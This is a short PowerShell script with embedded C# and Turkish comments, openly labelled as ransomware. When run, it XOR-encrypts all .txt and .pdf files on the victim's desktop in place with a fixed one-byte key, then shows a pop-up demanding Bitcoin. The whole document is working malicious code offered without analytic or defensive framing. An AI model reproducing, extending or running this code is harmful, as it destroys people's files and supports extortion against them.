Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;

public class Ransomware
{
    // XOR anahtarı
    static byte key = 0xAA;

    public static void EncryptFile(string path)
    {
        try
        {
            byte[] data = File.ReadAllBytes(path);
            for (int i = 0; i < data.Length; i++)
            {
                data[i] ^= key;
            }
            File.WriteAllBytes(path, data);
            Console.WriteLine(""Şifrelendi: "" + path);
        }
        catch (Exception ex)
        {
            Console.WriteLine(""Hata: "" + ex.Message);
        }
    }

    public static void EncryptDesktop()
    {
        string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string[] exts = { "".txt"", "".pdf"" };
        foreach (string ext in exts)
        {
            foreach (string file in Directory.GetFiles(desktop, ""*"" + ext))
            {
                EncryptFile(file);
            }
        }
    }
}
"@

# Masaüstündeki dosyaları şifrele
[Ransomware]::EncryptDesktop()

# Uyarı mesajı göster
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('Tüm dosyalar şifrelendi! BTC gönder!', 'Ransomware', 'OK', 'Warning')

